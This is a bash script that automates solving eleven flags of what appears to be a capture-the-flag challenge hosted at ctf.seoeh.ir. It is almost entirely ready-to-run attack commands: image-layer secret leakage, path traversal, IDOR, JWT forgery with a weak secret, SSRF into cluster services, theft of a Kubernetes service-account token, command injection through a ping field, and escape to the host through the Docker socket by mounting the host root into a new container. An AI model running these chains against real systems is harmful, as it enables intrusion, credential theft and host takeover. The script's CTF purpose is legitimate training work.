#!/usr/bin/env bash
set -euo pipefail

BASE="https://ctf.seoeh.ir"
REG="https://hub.hamdocker.ir"

say() {
  printf '\n[%s]\n' "$1"
}

say "F1 - Docker layer leak"
TOK=$(curl -sk "$REG/v2/token?service=harbor-registry&scope=repository:seoeh/hamamooz_challlenges:pull" \
  | python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])')
tmpdir=$(mktemp -d)
curl -sk -H "Authorization: Bearer $TOK" \
  "$REG/v2/seoeh/hamamooz_challlenges/blobs/sha256:cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041" \
  | tar xz -C "$tmpdir"
grep -ao 'HAMAMOOZ{[^}]*}' "$tmpdir/app/.env" || true
rm -rf "$tmpdir"

say "F2 - Swagger schema"
curl -sk "$BASE/swagger.json" \
  | python3 -c 'import json,sys,re; print("\n".join(re.findall(r"HAMAMOOZ\{[^}]+\}", json.load(sys.stdin)["info"]["description"])))'

say "F3 - Debug header"
curl -sk -H "X-Debug-Mode: true" "$BASE/api/internal/flag" \
  | grep -ao 'HAMAMOOZ{[^}]*}' || true

say "F4 - Path traversal"
curl -sk "$BASE/api/reports/download?file=../flag.txt" \
  | grep -ao 'HAMAMOOZ{[^}]*}' || true

say "F5 - IDOR"
curl -sk "$BASE/api/orgs/2/reports/2" \
  | grep -ao 'HAMAMOOZ{[^}]*}' || true

say "F6 - JWT role forgery"
ADMIN_TOKEN=$(python3 - <<'PY'
import base64, json, hmac, hashlib
secret = b"changeme123"
def b64raw(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub":"1","username":"acmeuser","org":"Acme Corp","role":"admin"}
h = b64raw(json.dumps(header, separators=(",", ":")).encode())
p = b64raw(json.dumps(payload, separators=(",", ":")).encode())
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{b64raw(sig)}")
PY
)
curl -sk "$BASE/admin/dashboard" -H "Authorization: Bearer $ADMIN_TOKEN" \
  | grep -ao 'HAMAMOOZ{[^}]*}' || true

say "F7 - SSRF admin panel"
curl -sk -X POST "$BASE/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://admin-panel.internal-tools.svc.cluster.local/","method":"GET","headers":{}}' \
  | grep -ao 'HAMAMOOZ{[^}]*}' || true

say "F8 - Kubernetes secret"
K8S_TOKEN=$(curl -sk "$BASE/api/reports/download?file=../../../var/run/secrets/kubernetes.io/serviceaccount/token")
curl -sk -X POST "$BASE/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets/flag-secret\",\"method\":\"GET\",\"headers\":{\"Authorization\":\"Bearer $K8S_TOKEN\"}}" \
  | python3 -c 'import json,sys,base64,re; s=sys.stdin.read(); m=re.search(r"SEFNQU1PT1p7[^\"\\\\]+", s); print(base64.b64decode(m.group(0)).decode() if m else "")'

say "F9 - Ping command injection"
curl -sk -X POST "$BASE/api/diag/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}' \
  | grep -ao 'HAMAMOOZ{[^}]*}' || true

say "F10 - Privileged pod hostPath"
curl -sk -X POST "$BASE/api/diag/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; kubectl -n escape-zone exec legacy-worker -- cat /host/var/lib/node-data/flag.txt"}' \
  | grep -ao 'HAMAMOOZ{[^}]*}' || true

say "F11 - Docker socket escape"
curl -sk -X POST "$BASE/api/diag/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; kubectl -n escape-zone exec legacy-worker -- sh -c '\''curl -s --unix-socket /host/run/docker.sock -X DELETE \"http://localhost/v1.41/containers/esc?force=true\" >/dev/null 2>&1 || true; curl -s --unix-socket /host/run/docker.sock -X POST \"http://localhost/v1.41/containers/create?name=esc\" -H \"Content-Type: application/json\" -d \"{\\\"Image\\\":\\\"ctf/backend:latest\\\",\\\"User\\\":\\\"0\\\",\\\"HostConfig\\\":{\\\"Binds\\\":[\\\"/:/host\\\"]},\\\"Cmd\\\":[\\\"sh\\\",\\\"-c\\\",\\\"cat /host/home/ubuntu/flag.txt\\\"]}\"; curl -s --unix-socket /host/run/docker.sock -X POST \"http://localhost/v1.41/containers/esc/start\"; curl -s --unix-socket /host/run/docker.sock \"http://localhost/v1.41/containers/esc/logs?stdout=1&stderr=1\"'\''"}' \
  | grep -ao 'HAMAMOOZ{[^}]*}' || true
